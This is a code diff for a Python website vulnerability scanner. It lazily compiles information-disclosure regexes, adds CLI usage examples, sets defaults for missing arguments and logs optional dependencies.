     def _extract_links(self, url, html):
         """
@@ -4293,8 +4748,14 @@ class InfoDisclosureScanner:
         for pattern_name, pattern_info in self.patterns.items():
             try:
                 # Use compiled regex pattern to find matches
-                compiled_pattern = pattern_info['compiled']
-                matches = compiled_pattern.findall(content_to_scan)
+                # Check if this pattern has already been compiled, otherwise compile it now
+                if 'compiled' not in pattern_info:
+                    # Compile the regex pattern
+                    pattern_info['compiled'] = re.compile(pattern_info['regex_str'], re.IGNORECASE | re.MULTILINE)
+                
+                # Use the compiled pattern
+                compiled_regex = pattern_info['compiled']
+                matches = compiled_regex.findall(content_to_scan)
                 
                 # Filter matches to remove false positives
                 filtered_matches = []
@@ -4454,8 +4915,14 @@ def print_banner():
 def parse_arguments():
     """Parse command line arguments."""
     parser = argparse.ArgumentParser(
-        description='Advanced Website Vulnerability Scanner',
-        formatter_class=argparse.RawTextHelpFormatter
+        description=f'Advanced Website Vulnerability Scanner v{VERSION}',
+        formatter_class=argparse.RawTextHelpFormatter,
+        epilog=f"Examples:\n"
+               f"  Basic scan: {sys.argv[0]} https://example.com\n"
+               f"  Full scan with verbose output: {sys.argv[0]} https://example.com -v\n"
+               f"  Custom scan: {sys.argv[0]} https://example.com --scan-type sqli,xss,ssl\n"
+               f"  Multiple targets: {sys.argv[0]} --target-list targets.txt -v --scan-type headers,ssl\n"
+               f"  Interactive mode: {sys.argv[0]} -i\n"
     )
     
     # Target specification - can be URL, IP, CIDR range, or left empty for interactive mode
@@ -4673,26 +5140,7 @@ def run_interactive_mode():
                 print(f"{Fore.RED}Target URL is required{Style.RESET_ALL}")
                 continue
                 
-            # Create args object with a proper class for compatibility
-            class ScanArgs:
-                def __init__(self):
-                    self.url = None
-                    self.scan_types = None
-                    self.timeout = None
-                    self.threads = None
-                    self.depth = None
-                    self.crawl = None
-                    self.verbose = None
-                    self.output = None
-                    self.user_agent = None
-                    self.custom_headers = None
-                    self.show_progress = None
-                    self.save_state = None
-                    self.risk_threshold = None
-                    self.aggressive = None
-                    self.quiet = None
-                    self.json = None
-            
+            # Create args object using the global ScanArgs class
             args = ScanArgs()
             args.url = target
             args.scan_types = ['headers', 'info']
@@ -4890,7 +5338,7 @@ def run_interactive_mode():
             args.aggressive = False
             args.quiet = False
             args.json = False
-            args.target_list = None
+            args.target_list = ''  # Set to empty string instead of None
             
             # Expand targets if it's a CIDR range
             targets = expand_targets(target_spec)
@@ -4952,7 +5400,7 @@ def run_interactive_mode():
                     
                     # Create args object from resume data
                     args = ScanArgs()
-                    args.url = resume_data.get('target_url')
+                    args.url = resume_data.get('target_url', 'https://example.com')  # Provide default URL to avoid None
                     args.scan_types = resume_data.get('scan_types', ['headers', 'info'])
                     args.timeout = resume_data.get('timeout', 10)
                     args.threads = resume_data.get('threads', 5)
@@ -5220,6 +5668,9 @@ def run_scan_on_target(args, logger, show_summary=True):
 
 def main():
     """Main function to run the vulnerability scanner."""
+    # Capture start time for overall execution timing
+    start_total = time.time()
+    
     # Setup signal handler for clean exit
     signal.signal(signal.SIGINT, signal_handler)
     
@@ -5229,6 +5680,18 @@ def main():
     # Setup logging
     log_level = logging.DEBUG if args.verbose else (logging.ERROR if args.quiet else logging.INFO)
     logger = setup_logger(args.log_file, log_level, args.no_color)
+    
+    # Log startup information
+    logger.info(f"WebScan v{VERSION} started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    
+    # Check for optional dependencies and log their status
+    # This helps users understand which enhanced features are available
+    if not TRAFILATURA_AVAILABLE:
+        logger.info("Optional dependency 'trafilatura' not found. Content extraction will be limited.")
+    if not DNS_AVAILABLE:
+        logger.info("Optional dependency 'dnspython' not found. DNS reconnaissance will be limited.")
+    if not SELENIUM_AVAILABLE:
+        logger.info("Optional dependency 'selenium' not found. Dynamic scanning will be disabled.")
     
     # Interactive mode
     if args.interactive:
@@ -5242,7 +5705,7 @@ def main():
             return 1
         
         # Override args with resume data
-        args.url = resume_data.get('target_url')
+        args.url = resume_data.get('target_url', 'https://example.com')  # Default to prevent None
         args.scan_types = resume_data.get('scan_types', args.scan_types)
         args.timeout = resume_data.get('timeout', args.timeout)
         args.threads = resume_data.get('threads', args.threads)
@@ -5279,7 +5742,13 @@ def main():
             # Adjust output file for each target
             if args.output:
                 base_name, ext = os.path.splitext(args.output)
-                args.output = f"{base_name}_{urlparse(target).netloc.replace(':', '_')}{ext}"
+                # Replace any colons in the domain with underscores for filename safety
+                netloc = urlparse(target).netloc
+                # Replace colons with underscores using a safer string method
+                safe_netloc = netloc
+                if ':' in safe_netloc:
+                    safe_netloc = '_'.join(safe_netloc.split(':'))
+                args.output = f"{base_name}_{safe_netloc}{ext}"
             
             result = run_scan_on_target(args, logger, show_summary=True)
             
